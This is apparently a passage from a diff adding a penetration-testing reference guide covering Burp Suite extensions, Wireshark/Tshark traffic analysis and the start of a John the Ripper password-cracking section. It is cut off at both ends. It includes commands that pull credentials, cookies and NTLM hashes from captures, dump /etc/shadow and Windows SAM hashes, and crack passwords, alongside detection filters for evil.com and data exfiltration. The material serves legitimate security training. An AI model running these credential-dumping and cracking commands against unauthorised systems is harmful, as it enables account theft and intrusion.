+```bash
+# Enhanced logging with filtering
+- Regex filtering
+- Colorization
+- Export to CSV
+- Useful for tracking specific parameters/responses
+```
+
+**Turbo Intruder:** High-speed fuzzing
+
+```bash
+# Python-based custom fuzzing
+- Much faster than built-in Intruder
+- Custom Python scripts for attack logic
+- HTTP/2 support
+
+# Example usage
+Send to Turbo Intruder → Select template → Modify script
+```
+
+**Param Miner:** Parameter discovery
+
+```bash
+# Discovers hidden parameters
+Right-click request → Extensions → Param Miner → Guess parameters
+- GET parameters
+- POST parameters
+- Headers
+- Cookies
+```
+
+**JSON Web Tokens (JWT) Extensions:**
+
+```bash
+# JWT Editor
+- Decode/encode JWT
+- Generate signing keys
+- Test algorithm confusion
+- Inject custom claims
+```
+
+**ActiveScan++:** Additional scan checks
+
+```bash
+# Adds extra vulnerability checks
+- Host header injection
+- HTTP/2 smuggling
+- Edge side includes
+- Template injection
+```
+
+**Collaborator Everywhere:** SSRF/OOB testing
+
+```bash
+# Automatically injects Collaborator payloads
+- Detects blind SSRF
+- Out-of-band injection points
+- DNS/HTTP callbacks
+```
+
+### Advanced Features
+
+**Session Handling Rules:**
+
+```bash
+Project options → Sessions → Session Handling Rules → Add
+
+# Use cases:
+- Automatic re-authentication
+- CSRF token refresh
+- Multi-step authentication
+- Session validation
+
+# Example: CSRF token refresh
+1. If request has CSRF parameter
+2. Run macro to get fresh token
+3. Update current request with new token
+```
+
+**Macros:**
+
+```bash
+Project options → Sessions → Macros → Add
+
+# Record sequence of requests
+- Login sequence
+- Token generation
+- Multi-step processes
+
+# Use in session handling rules
+```
+
+**Match and Replace:**
+
+```bash
+Proxy → Options → Match and Replace → Add
+
+# Automatic request/response modification
+Type: Request header
+Match: User-Agent: .*
+Replace: User-Agent: CustomUA
+
+# Use cases:
+- Header injection
+- Parameter manipulation
+- Response modification for testing
+```
+
+**Project Files:**
+
+```bash
+# Save project state
+Burp → Project → Save project
+
+# Project options vs User options
+- Project options: Specific to current project (scope, sessions)
+- User options: Global settings (proxy, display)
+
+# Export/Import settings
+Burp → Settings → Load/Save configuration
+```
+
+### Burp Collaborator
+
+**Out-of-Band Interaction Detection:**
+
+```bash
+# Built-in Collaborator server (Pro only)
+Burp Collaborator client → Generate payload
+
+# Manual polling
+Burp Collaborator client → Poll now
+
+# Use cases:
+- Blind SSRF detection
+- XXE exfiltration
+- Blind command injection
+- Blind SQL injection (DNS)
+```
+
+**Custom Collaborator Server:**
+
+```bash
+# Run private Collaborator (requires domain and SSL)
+java -jar burp.jar --collaborator-server --collaborator-config=config.properties
+
+# config.properties example:
+serverDomain=collab.yourdomain.com
+eventCapture.https.port=443
+eventCapture.http.port=80
+```
+
+### Burp Suite Professional CLI
+
+**Headless Scanning:**
+
+```bash
+# Run scan from command line
+java -jar -Xmx4G burpsuite_pro.jar --project-file=project.burp --unpause-spider-and-scanner
+
+# Generate scan report
+java -jar burpsuite_pro.jar --project-file=project.burp --report-output=report.html --report-type=HTML
+```
+
+### Performance Optimization
+
+```bash
+# Increase Java heap size
+java -jar -Xmx8G /usr/share/burpsuite/burpsuite.jar
+
+# Disable unnecessary features during scanning
+Target → Site map → Show only in-scope items
+Proxy → Options → Intercept Client Requests → (disable during passive scanning)
+
+# Limit active scan thread count (for stability)
+Scanner → Options → Active Scanning → Number of threads: 10-30
+
+# Database optimization (large projects)
+Project options → Misc → Temporary files location → Use disk-based storage
+```
+
+## Wireshark/Tshark
+
+Wireshark is the industry-standard network protocol analyzer. Tshark provides command-line packet capture and analysis capabilities.
+
+### Wireshark GUI Essentials
+
+**Starting Capture:**
+
+```bash
+# Launch Wireshark
+sudo wireshark
+
+# Select interface
+Capture → Options → Select interface (eth0, wlan0, etc.)
+- Promiscuous mode: Capture all packets on network segment
+- Monitor mode (wireless): Capture all wireless traffic
+
+# Start capture
+Capture → Start (or Ctrl+E)
+
+# Capture filters (applied before capture)
+Capture → Options → Capture filter
+```
+
+**Capture Filters (BPF Syntax):**
+
+```bash
+# Host filtering
+host 192.168.1.10
+src host 192.168.1.10
+dst host 192.168.1.10
+
+# Network filtering
+net 192.168.1.0/24
+src net 10.0.0.0/8
+
+# Port filtering
+port 80
+port 80 or port 443
+portrange 1-1024
+
+# Protocol filtering
+tcp
+udp
+icmp
+arp
+
+# Combined filters
+tcp and port 80
+host 192.168.1.10 and (port 80 or port 443)
+tcp and src host 192.168.1.10 and dst port 443
+
+# Exclude traffic
+not port 22
+not host 192.168.1.1
+
+# Capture only SYN packets
+tcp[tcpflags] & tcp-syn != 0
+
+# Capture only packets with data
+tcp[((tcp[12:1] & 0xf0) >> 2):4] != 0
+```
+
+**Display Filters (Applied After Capture):**
+
+```bash
+# IP filtering
+ip.addr == 192.168.1.10
+ip.src == 192.168.1.10
+ip.dst == 192.168.1.10
+
+# TCP/UDP port filtering
+tcp.port == 80
+tcp.srcport == 443
+tcp.dstport == 3389
+udp.port == 53
+
+# Protocol filtering
+http
+dns
+ssh
+smb
+smb2
+
+# HTTP-specific
+http.request.method == "POST"
+http.request.uri contains "admin"
+http.response.code == 200
+http.cookie contains "session"
+http.user_agent contains "sqlmap"
+
+# DNS queries
+dns.qry.name contains "evil.com"
+dns.qry.type == 1  # A records
+dns.qry.type == 28  # AAAA records
+
+# TCP flags
+tcp.flags.syn == 1
+tcp.flags.reset == 1
+tcp.flags.push == 1
+tcp.flags.fin == 1
+
+# String searching
+frame contains "password"
+tcp contains "admin"
+http.request.uri contains "../../"
+
+# Logical operators
+http and ip.addr == 192.168.1.10
+tcp.port == 80 or tcp.port == 443
+!(arp or icmp or dns)
+
+# Follow TCP stream
+tcp.stream eq 0
+tcp.stream eq 5
+
+# Time-based filtering
+frame.time >= "2024-01-15 10:00:00"
+frame.time_delta > 1  # Packets with >1s delay
+```
+
+**Following Streams:**
+
+```bash
+# Right-click packet → Follow → TCP/UDP/HTTP/TLS Stream
+- View entire conversation
+- Filter: tcp.stream eq N
+- Show data as: ASCII, EBCDIC, Hex Dump, C Arrays, Raw
+
+# Extract stream data
+Follow Stream → Save as → Raw data
+```
+
+**Packet Details Inspection:**
+
+```bash
+# Packet layers (bottom-up)
+Frame → Ethernet → IP → TCP/UDP → Application Protocol
+
+# Expand sections
+Click ">" to expand protocol details
+
+# Right-click field → Apply as Filter
+- Selected
+- Not Selected
+- ... and Selected
+- ... or Selected
+```
+
+**Statistics and Analysis:**
+
+```bash
+# Protocol hierarchy
+Statistics → Protocol Hierarchy
+- Shows distribution of protocols
+- Percentage of traffic per protocol
+
+# Conversations
+Statistics → Conversations
+- TCP/UDP/IP conversations
+- Bytes transferred per conversation
+- Sort by packets/bytes
+
+# Endpoints
+Statistics → Endpoints
+- Traffic per IP/MAC address
+- Transmission statistics
+
+# IO Graphs
+Statistics → I/O Graph
+- Visual traffic patterns over time
+- Filter-specific graphs
+- Y-axis: Packets/Bytes/Bits/Advanced
+
+# HTTP statistics
+Statistics → HTTP → Requests
+Statistics → HTTP → Load Distribution
+Statistics → HTTP → Packet Counter
+Statistics → HTTP → Request Sequences
+```
+
+**Exporting Objects:**
+
+```bash
+# Export HTTP objects
+File → Export Objects → HTTP
+- Lists all HTTP objects (images, files, etc.)
+- Save individual or all objects
+
+# Export other protocols
+File → Export Objects → SMB/TFTP/FTP/DICOM
+```
+
+**Coloring Rules:**
+
+```bash
+View → Coloring Rules
+
+# Default colors
+- Green: TCP conversation
+- Light blue: UDP conversation
+- Black: TCP errors
+- Red: Problems/errors
+- Yellow: HTTP
+
+# Add custom coloring
+Coloring Rules → Add
+Name: Suspicious Traffic
+Filter: http.request.uri contains "cmd"
+Foreground: Red
+```
+
+### Tshark Command-Line Analysis
+
+**Basic Capture:**
+
+```bash
+# List interfaces
+tshark -D
+
+# Capture on specific interface
+sudo tshark -i eth0
+
+# Capture to file
+sudo tshark -i eth0 -w capture.pcap
+
+# Capture N packets
+sudo tshark -i eth0 -c 100
+
+# Capture for duration (seconds)
+sudo tshark -i eth0 -a duration:60
+
+# Capture with file size limit
+sudo tshark -i eth0 -a filesize:100000  # 100MB
+```
+
+**Reading Capture Files:**
+
+```bash
+# Read pcap file
+tshark -r capture.pcap
+
+# Read with display filter
+tshark -r capture.pcap -Y "http"
+tshark -r capture.pcap -Y "ip.src==192.168.1.10"
+
+# Read specific number of packets
+tshark -r capture.pcap -c 50
+```
+
+**Display Filters in Tshark:**
+
+```bash
+# HTTP requests
+tshark -r capture.pcap -Y "http.request"
+
+# HTTP POST requests
+tshark -r capture.pcap -Y "http.request.method==POST"
+
+# DNS queries for specific domain
+tshark -r capture.pcap -Y "dns.qry.name contains evil.com"
+
+# TCP SYN packets
+tshark -r capture.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0"
+
+# Packets with specific string
+tshark -r capture.pcap -Y "frame contains password"
+
+# TLS handshakes
+tshark -r capture.pcap -Y "tls.handshake"
+```
+
+**Output Formatting:**
+
+```bash
+# Verbose output (packet details)
+tshark -r capture.pcap -V
+
+# One-line summary
+tshark -r capture.pcap -T fields -e frame.number -e ip.src -e ip.dst -e tcp.port
+
+# Custom fields
+
+tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e http.request.uri
+
+# CSV output
+
+tshark -r capture.pcap -T fields -E header=y -E separator=, -e ip.src -e ip.dst -e tcp.port
+
+# JSON output
+
+tshark -r capture.pcap -T json
+
+# PDML (Packet Details Markup Language)
+
+tshark -r capture.pcap -T pdml
+
+# PS (PostScript) for printing
+
+tshark -r capture.pcap -T ps
+````
+
+**Field Extraction:**
+```bash
+# Extract specific HTTP fields
+tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri -e http.user_agent
+
+# Extract DNS queries and responses
+tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name -e dns.resp.addr
+
+# Extract credentials from FTP
+tshark -r capture.pcap -Y "ftp.request.command==USER or ftp.request.command==PASS" -T fields -e ftp.request.arg
+
+# Extract cookies
+tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie
+
+# Extract file transfers
+tshark -r capture.pcap -Y "http.response" -T fields -e http.content_type -e http.content_length
+
+# Extract SMB filenames
+tshark -r capture.pcap -Y "smb2.filename" -T fields -e smb2.filename
+````
+
+**Statistics and Analysis:**
+
+```bash
+# Protocol hierarchy
+tshark -r capture.pcap -q -z io,phs
+
+# Conversation statistics
+tshark -r capture.pcap -q -z conv,tcp
+tshark -r capture.pcap -q -z conv,udp
+tshark -r capture.pcap -q -z conv,ip
+
+# Endpoint statistics
+tshark -r capture.pcap -q -z endpoints,tcp
+tshark -r capture.pcap -q -z endpoints,ip
+
+# HTTP statistics
+tshark -r capture.pcap -q -z http,tree
+tshark -r capture.pcap -q -z http_req,tree
+tshark -r capture.pcap -q -z http_srv,tree
+
+# DNS statistics
+tshark -r capture.pcap -q -z dns,tree
+
+# Expert info (errors/warnings)
+tshark -r capture.pcap -q -z expert
+
+# IO statistics (traffic rate over time)
+tshark -r capture.pcap -q -z io,stat,1  # 1-second intervals
+tshark -r capture.pcap -q -z io,stat,1,"COUNT(tcp.port)tcp.port==80"
+
+# Follow TCP stream (by stream number)
+tshark -r capture.pcap -q -z follow,tcp,ascii,0
+
+# Service Response Time
+tshark -r capture.pcap -q -z smb,srt
+tshark -r capture.pcap -q -z dcerpc,srt
+```
+
+**Advanced Filtering:**
+
+```bash
+# Capture filter (BPF during capture)
+sudo tshark -i eth0 -f "tcp port 80"
+sudo tshark -i eth0 -f "host 192.168.1.10 and not port 22"
+
+# Display filter (after capture)
+tshark -r capture.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0"
+
+# Complex filters
+tshark -r capture.pcap -Y "http.request.method==POST and http.request.uri contains login"
+
+# Regex matching
+tshark -r capture.pcap -Y "http.host matches \".*\\.evil\\.com\""
+
+# Time range filtering
+tshark -r capture.pcap -Y "frame.time >= \"2024-01-15 10:00:00\" and frame.time <= \"2024-01-15 11:00:00\""
+```
+
+**Decryption:**
+
+```bash
+# SSL/TLS decryption with key log file
+tshark -r capture.pcap -o "tls.keylog_file:/path/to/sslkeylog.log" -Y "http"
+
+# WPA/WPA2 decryption
+tshark -r wireless.pcap -o "wlan.enable_decryption:TRUE" -o "uat:80211_keys:\"wpa-pwd\",\"password:SSID\""
+
+# Export decrypted data
+tshark -r capture.pcap -o "tls.keylog_file:/path/to/sslkeylog.log" --export-objects http,/output/directory/
+```
+
+**Packet Manipulation:**
+
+```bash
+# Edit capture (requires editcap)
+editcap capture.pcap output.pcap
+
+# Extract specific time range
+editcap -A "2024-01-15 10:00:00" -B "2024-01-15 11:00:00" capture.pcap filtered.pcap
+
+# Extract specific packet range
+editcap capture.pcap output.pcap 100-500
+
+# Remove duplicate packets
+editcap -d capture.pcap deduplicated.pcap
+
+# Split capture file
+editcap -c 1000 capture.pcap split.pcap  # Split every 1000 packets
+```
+
+**Merging Captures:**
+
+```bash
+# Merge multiple capture files
+mergecap -w merged.pcap capture1.pcap capture2.pcap capture3.pcap
+
+# Merge with sorting by timestamp
+mergecap -w merged.pcap -a capture1.pcap capture2.pcap
+```
+
+### Practical Analysis Scenarios
+
+**HTTP Credential Extraction:**
+
+```bash
+# Extract HTTP Basic Auth
+tshark -r capture.pcap -Y "http.authbasic" -T fields -e http.authbasic
+
+# Extract HTTP POST data
+tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data
+
+# Extract login attempts
+tshark -r capture.pcap -Y "http.request.uri contains login" -T fields -e ip.src -e http.request.uri -e http.file_data
+
+# Extract HTTP credentials (form data)
+tshark -r capture.pcap -Y "http.request.method==POST" -V | grep -E "user|pass|login"
+```
+
+**DNS Analysis:**
+
+```bash
+# Extract all DNS queries
+tshark -r capture.pcap -Y "dns.flags.response==0" -T fields -e dns.qry.name | sort -u
+
+# Find DNS tunneling (long queries)
+tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name -e dns.qry.name.len | awk '$2 > 50'
+
+# DNS C2 detection (high query frequency)
+tshark -r capture.pcap -Y "dns" -T fields -e ip.src -e dns.qry.name | sort | uniq -c | sort -nr
+
+# Extract DNS answers
+tshark -r capture.pcap -Y "dns.flags.response==1" -T fields -e dns.qry.name -e dns.a -e dns.aaaa
+```
+
+**Malware Traffic Analysis:**
+
+```bash
+# Identify beaconing (regular intervals)
+tshark -r capture.pcap -Y "http.request" -T fields -e frame.time -e ip.dst -e http.host
+
+# Extract contacted domains
+tshark -r capture.pcap -Y "http.request" -T fields -e http.host | sort -u
+
+# User-Agent analysis (identify malware UA)
+tshark -r capture.pcap -Y "http.request" -T fields -e http.user_agent | sort -u
+
+# Extract downloaded executables
+tshark -r capture.pcap --export-objects http,/tmp/objects/
+file /tmp/objects/* | grep "executable"
+
+# Detect data exfiltration (large uploads)
+tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e ip.src -e http.host -e http.content_length | awk '$3 > 1000000'
+```
+
+**Network Reconnaissance Detection:**
+
+```bash
+# Detect port scans (multiple SYN to different ports)
+tshark -r capture.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0" -T fields -e ip.src -e ip.dst -e tcp.dstport | awk '{print $1,$2}' | sort | uniq -c | sort -nr
+
+# Detect ping sweeps (ICMP to multiple hosts)
+tshark -r capture.pcap -Y "icmp.type==8" -T fields -e ip.src -e ip.dst | awk '{print $1}' | sort | uniq -c | sort -nr
+
+# Identify ARP scanning
+tshark -r capture.pcap -Y "arp.opcode==1" -T fields -e arp.src.hw_mac -e arp.dst.proto_ipv4 | awk '{print $1}' | sort | uniq -c | sort -nr
+```
+
+**SMB/CIFS Analysis:**
+
+```bash
+# Extract SMB file transfers
+tshark -r capture.pcap -Y "smb2.filename" -T fields -e ip.src -e ip.dst -e smb2.filename
+
+# Detect SMB authentication attempts
+tshark -r capture.pcap -Y "ntlmssp.auth.username" -T fields -e ip.src -e ip.dst -e ntlmssp.auth.username -e ntlmssp.auth.domain
+
+# Extract NTLM hashes (challenge/response)
+tshark -r capture.pcap -Y "ntlmssp" -T fields -e ntlmssp.ntlmserverchallenge -e ntlmssp.ntlmclientchallenge -e ntlmssp.auth.ntresponse
+
+# SMB shares enumeration
+tshark -r capture.pcap -Y "smb2.tree" -T fields -e smb2.tree
+
+# Detect EternalBlue exploitation attempts
+tshark -r capture.pcap -Y "smb2.msg_id > 1000" -T fields -e ip.src -e ip.dst
+```
+
+**TLS/SSL Analysis:**
+
+```bash
+# Extract TLS Server Hello (identify server)
+tshark -r capture.pcap -Y "tls.handshake.type==2" -T fields -e ip.dst -e tls.handshake.extensions_server_name
+
+# Extract TLS certificates
+tshark -r capture.pcap -Y "tls.handshake.certificate" -T fields -e x509ce.dNSName
+
+# Detect weak ciphers
+tshark -r capture.pcap -Y "tls.handshake.ciphersuite" -T fields -e tls.handshake.ciphersuite | sort -u
+
+# TLS version analysis
+tshark -r capture.pcap -Y "tls.handshake.version" -T fields -e tls.handshake.version | sort | uniq -c
+
+# Extract SNI (Server Name Indication)
+tshark -r capture.pcap -Y "tls.handshake.extensions_server_name" -T fields -e tls.handshake.extensions_server_name | sort -u
+```
+
+**Wireless (802.11) Analysis:**
+
+```bash
+# Extract SSIDs
+tshark -r wireless.pcap -Y "wlan.ssid" -T fields -e wlan.ssid | sort -u
+
+# Detect deauth attacks
+tshark -r wireless.pcap -Y "wlan.fc.type_subtype==0x000c"
+
+# Extract WPA handshakes
+tshark -r wireless.pcap -Y "eapol" -w handshake.pcap
+
+# Client-AP associations
+tshark -r wireless.pcap -Y "wlan.fc.type_subtype==0x0000" -T fields -e wlan.sa -e wlan.da
+
+# Detect evil twin APs (same SSID, different BSSID)
+tshark -r wireless.pcap -Y "wlan.ssid" -T fields -e wlan.ssid -e wlan.bssid | sort -u
+```
+
+**VoIP/SIP Analysis:**
+
+```bash
+# Extract SIP traffic
+tshark -r capture.pcap -Y "sip"
+
+# SIP call statistics
+tshark -r capture.pcap -q -z sip,stat
+
+# Extract RTP streams
+tshark -r capture.pcap -Y "rtp"
+
+# Extract VoIP conversations (requires rtpdump)
+tshark -r capture.pcap -q -z rtp,streams
+
+# Detect SIP authentication failures
+tshark -r capture.pcap -Y "sip.Status-Code==401 or sip.Status-Code==407"
+```
+
+**IPv6 Analysis:**
+
+```bash
+# Extract IPv6 traffic
+tshark -r capture.pcap -Y "ipv6"
+
+# ICMPv6 neighbor discovery
+tshark -r capture.pcap -Y "icmpv6.type==135 or icmpv6.type==136"
+
+# Detect IPv6 tunneling
+tshark -r capture.pcap -Y "ipv6.nxt==41"  # IPv6 in IPv4
+
+# Extract IPv6 addresses
+tshark -r capture.pcap -Y "ipv6" -T fields -e ipv6.src -e ipv6.dst | sort -u
+```
+
+### Performance and Optimization
+
+**Ring Buffer Capture (Continuous):**
+
+```bash
+# Capture with rotating files
+sudo tshark -i eth0 -b filesize:100000 -b files:10 -w capture.pcap
+# Creates: capture_00001.pcap, capture_00002.pcap, etc.
+# Keeps last 10 files, each 100MB max
+
+# Time-based rotation
+sudo tshark -i eth0 -b duration:3600 -b files:24 -w hourly.pcap
+# New file every hour, keeps 24 hours
+```
+
+**Reducing Capture Size:**
+
+```bash
+# Capture only headers (snaplen)
+sudo tshark -i eth0 -s 128 -w headers.pcap
+
+# Exclude specific traffic
+sudo tshark -i eth0 -f "not port 22" -w no_ssh.pcap
+
+# Capture specific protocols only
+sudo tshark -i eth0 -f "tcp port 80 or tcp port 443" -w web_only.pcap
+```
+
+**Performance Tuning:**
+
+```bash
+# Increase buffer size (reduce packet drops)
+sudo tshark -i eth0 -B 128 -w capture.pcap  # 128MB buffer
+
+# Disable name resolution
+tshark -r capture.pcap -n  # No IP/port name resolution
+tshark -r capture.pcap -N n  # No name resolution at all
+
+# Use capture filter instead of display filter
+sudo tshark -i eth0 -f "tcp port 80"  # Faster than -Y "tcp.port==80"
+```
+
+### Wireshark Profiles
+
+**Custom Profiles:**
+
+```bash
+# Create profile for specific task
+Edit → Configuration Profiles → New
+- HTTP Analysis Profile: Custom columns, filters, coloring rules
+- Malware Analysis Profile: Specific display filters
+- Wireless Profile: 802.11 preferences
+
+# Switch profiles
+Bottom-right corner dropdown or Ctrl+Shift+A
+
+# Export/Import profiles
+Edit → Configuration Profiles → Manage → Export/Import
+```
+
+**Custom Columns:**
+
+```bash
+# Add custom columns
+Edit → Preferences → Appearance → Columns → Add
+
+# Useful custom columns:
+- HTTP Host: http.host
+- HTTP URI: http.request.uri
+- HTTP Method: http.request.method
+- DNS Query: dns.qry.name
+- TLS SNI: tls.handshake.extensions_server_name
+- TCP Stream: tcp.stream
+```
+
+### Decrypting HTTPS Traffic
+
+**SSL/TLS Key Log Method:**
+
+```bash
+# Enable SSLKEYLOGFILE in browser
+# Firefox/Chrome: Add environment variable
+export SSLKEYLOGFILE=/path/to/sslkeylog.log
+firefox &
+
+# Configure Wireshark
+Edit → Preferences → Protocols → TLS
+(Pre-)Master-Secret log filename: /path/to/sslkeylog.log
+
+# Capture and decrypt
+# HTTPS traffic will be decrypted automatically
+# View as: Right-click → Follow → HTTP Stream
+```
+
+**Using Private Key (Server-Side):**
+
+```bash
+# If you have server's private key
+Edit → Preferences → Protocols → TLS → RSA keys list → Add
+IP address: 192.168.1.10
+Port: 443
+Protocol: http
+Key File: /path/to/server.key
+
+# Note: Only works with RSA key exchange, not with Forward Secrecy (ECDHE)
+```
+
+### Network Forensics
+
+**Timeline Analysis:**
+
+```bash
+# Extract timeline of events
+tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst -e _ws.col.Protocol -e _ws.col.Info > timeline.txt
+
+# Generate conversation timeline
+tshark -r capture.pcap -q -z conv,tcp | grep "<->"
+```
+
+**Carving Files from PCAP:**
+
+```bash
+# Using Wireshark
+File → Export Objects → HTTP/SMB/TFTP/FTP
+
+# Using foremost (file carving)
+foremost -i capture.pcap -o carved_files/
+
+# Using NetworkMiner (GUI tool)
+networkminer capture.pcap
+# Extracts files, credentials, sessions automatically
+
+# Using tcpflow
+tcpflow -r capture.pcap -o output_dir/
+# Reconstructs TCP streams as files
+```
+
+**Detect Lateral Movement:**
+
+```bash
+# PSExec detection (port 445 activity)
+tshark -r capture.pcap -Y "smb2.cmd==5 and smb2.filename contains .exe"
+
+# WMI execution (port 135)
+tshark -r capture.pcap -Y "dcerpc" -T fields -e ip.src -e ip.dst -e dcerpc.cn_ctx_id
+
+# Pass-the-Hash detection (NTLM auth without Kerberos)
+tshark -r capture.pcap -Y "ntlmssp.auth.username and not kerberos"
+
+# RDP connections
+tshark -r capture.pcap -Y "tcp.port==3389 and tcp.flags.syn==1"
+```
+
+### Integration with Other Tools
+
+**Wireshark with Metasploit:**
+
+```bash
+# Capture exploit traffic
+sudo wireshark &
+# Start capture on relevant interface
+# Run Metasploit exploit
+# Analyze exploit packets in Wireshark
+
+# Filter Metasploit traffic
+tcp.stream eq [stream_number]
+```
+
+**Wireshark with Nmap:**
+
+```bash
+# Capture Nmap scan
+sudo tshark -i eth0 -f "host 192.168.1.10" -w nmap_scan.pcap &
+nmap -sS -p- 192.168.1.10
+
+# Analyze scan patterns
+tshark -r nmap_scan.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0" -T fields -e tcp.dstport | sort -n
+```
+
+**Wireshark with Burp Suite:**
+
+```bash
+# Capture web application testing
+sudo tshark -i lo -f "port 8080" -w burp_traffic.pcap &
+# Use Burp Suite through proxy
+
+# Analyze findings
+tshark -r burp_traffic.pcap -Y "http.request.method==POST" -T fields -e http.file_data
+```
+
+### Automation and Scripting
+
+**Tshark in Shell Scripts:**
+
+```bash
+#!/bin/bash
+# Monitor for suspicious DNS queries
+tshark -i eth0 -Y "dns" -T fields -e dns.qry.name | while read domain; do
+    if [[ $domain == *"evil.com"* ]]; then
+        echo "[!] Suspicious domain detected: $domain"
+        # Alert or block action
+    fi
+done
+```
+
+**Python with PyShark:**
+
+```python
+import pyshark
+
+cap = pyshark.FileCapture('capture.pcap')
+
+for packet in cap:
+    if 'HTTP' in packet:
+        try:
+            print(f"HTTP Request: {packet.http.host}{packet.http.request_uri}")
+        except AttributeError:
+            pass
+
+cap.close()
+```
+
+**Automated Analysis Script:**
+
+```bash
+#!/bin/bash
+# Quick PCAP analysis
+
+PCAP=$1
+
+echo "[*] Protocol Hierarchy:"
+tshark -r $PCAP -q -z io,phs
+
+echo -e "\n[*] Top Talkers:"
+tshark -r $PCAP -q -z endpoints,ip | head -20
+
+echo -e "\n[*] HTTP Hosts:"
+tshark -r $PCAP -Y "http.request" -T fields -e http.host | sort -u
+
+echo -e "\n[*] DNS Queries:"
+tshark -r $PCAP -Y "dns.flags.response==0" -T fields -e dns.qry.name | sort -u
+
+echo -e "\n[*] Suspicious User-Agents:"
+tshark -r $PCAP -Y "http.user_agent" -T fields -e http.user_agent | grep -iE "bot|scan|sqlmap|nikto" | sort -u
+
+echo -e "\n[*] Large POST Requests (potential data exfil):"
+tshark -r $PCAP -Y "http.request.method==POST" -T fields -e ip.src -e http.host -e http.content_length | awk '$3 > 1000000'
+```
+
+---
+
+**Related Topics:**
+
+- **Network Pivoting:** Chisel, ligolo-ng, SSH tunneling for compromised network traversal
+- **Traffic Manipulation:** Ettercap, Bettercap for MITM attacks and packet injection
+- **IDS/IPS Evasion:** Fragrouter, packet fragmentation, timing manipulation
+- **Wireless Attacks:** Aircrack-ng suite, wifite2, evil twin attacks
+- **Exploit Development:** Buffer overflow exploitation, ROP chains, shellcode development
+- **Web Application Testing:** OWASP Testing Guide, API security testing, GraphQL exploitation
+
+---
+
+## John the Ripper
+
+### Overview
+
+John the Ripper (JtR) performs password cracking through dictionary attacks, brute force, and hybrid modes. Supports numerous hash formats with extensible ruleset system.
+
+### Installation and Versions
+
+**Verify installation:**
+
+```bash
+john --version
+# Kali ships with jumbo version by default
+
+which john
+# /usr/sbin/john
+```
+
+**Install bleeding-jumbo (latest features):**
+
+```bash
+# Install dependencies
+sudo apt-get install git build-essential libssl-dev zlib1g-dev
+sudo apt-get install yasm libgmp-dev libpcap-dev pkg-config libbz2-dev
+
+# Clone and compile
+cd /opt
+sudo git clone https://github.com/openwall/john.git
+cd john/src
+sudo ./configure && sudo make -s clean && sudo make -sj4
+
+# Run bleeding-jumbo version
+/opt/john/run/john --version
+```
+
+### Hash Identification
+
+**Identify hash type:**
+
+```bash
+# Using hash-identifier
+hash-identifier
+# Paste hash when prompted
+
+# Using hashid
+hashid '$6$salt$hash'
+hashid -m '$6$salt$hash'  # Show hashcat mode numbers
+
+# Manual inspection
+# MD5: 32 hex characters
+# SHA-1: 40 hex characters
+# SHA-256: 64 hex characters
+# NTLM: 32 hex characters (similar to MD5)
+# bcrypt: Starts with $2a$, $2b$, $2y$
+# SHA-512 (Unix): Starts with $6$
+```
+
+**List supported formats:**
+
+```bash
+john --list=formats
+john --list=formats | grep -i ntlm
+john --list=formats | grep -i md5
+```
+
+### Hash Extraction
+
+**Unshadow (combine /etc/passwd and /etc/shadow):**
+
+```bash
+unshadow /etc/passwd /etc/shadow > hashes.txt
+john hashes.txt
+```
+
+**Extract Windows SAM hashes:**
+
+```bash
+# From registry hives (offline)
+samdump2 SYSTEM SAM > sam_hashes.txt
+
+# Using impacket-secretsdump
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL > sam_hashes.txt
+
+# Format: username:RID:LM_hash:NTLM_hash:::
+# Remove LM hashes if empty (first field after RID)
+cat sam_hashes.txt | cut -d: -f1,4 > ntlm_only.txt
+```
+
+**Extract SSH private key hashes:**
+
+```bash
+ssh2john id_rsa > id_rsa.hash
+ssh2john.py id_rsa > id_rsa.hash  # Python version
+```
+
+**Extract ZIP password hashes:**
+
+```bash
+zip2john protected.zip > zip.hash
+```
+
+**Extract RAR password hashes:**
+
+```bash
+rar2john protected.rar > rar.hash
+```
+
+**Extract PDF password hashes:**
+
+```bash
+pdf2john protected.pdf > pdf.hash
+```
+
+**Extract KeePass database hashes:**
+
+```bash
+keepass2john Database.kdbx > keepass.hash
+```
+
+**Extract 7z password hashes:**
+
+```bash
+7z2john protected.7z > 7z.hash
+```
+
+**Extract Office document hashes:**
+
+```bash
+office2john document.docx > office.hash
+```
+
+**Extract BitLocker hashes:**
+
+```bash
+bitlocker2john -i /dev/sda1 > bitlocker.hash
+```
+
+**Extract hash from pcap (network capture):**
+
+```bash
+# WPA/WPA2 handshake
+hccap2john capture.hccap > wpa.hash
+wpapcap2john capture.pcap > wpa.hash
+```
+
+### Basic Cracking Modes
+
+**Single crack mode (username-based mangling):**
+
+```bash
+# Uses username to generate password candidates
+john --single hashes.txt
+
+# Specify format
+john --format=raw-md5 --single hashes.txt
+```
+
+**Wordlist mode (dictionary attack):**
+
+```bash
+# Default wordlist
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# Specify format
+john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# Custom wordlist
+john --wordlist=custom_passwords.txt hashes.txt
+```
+
+**Incremental mode (brute force):**
+
+```bash
+# Default charset (all printable ASCII)
+john --incremental hashes.txt
+
+# Specific charset
+john --incremental=Alpha hashes.txt       # Letters only
+john --incremental=Digits hashes.txt      # Numbers only
+john --incremental=Alnum hashes.txt       # Alphanumeric
+
+# Custom incremental mode with length limits
+john --incremental=LowerNum --min-length=6 --max-length=8 hashes.txt
+```
+
+### Hash Format Specification
+
+**Common format examples:**
+
+```bash
+# Raw hashes
+john --format=raw-md5 hashes.txt
+john --format=raw-sha1 hashes.txt
+john --format=raw-sha256 hashes.txt
+john --format=raw-sha512 hashes.txt
+
+# Unix crypt formats
+john --format=crypt hashes.txt              # Auto-detect crypt variant
+john --format=sha512crypt hashes.txt        # $6$ prefix
+john --format=sha256crypt hashes.txt        # $5$ prefix
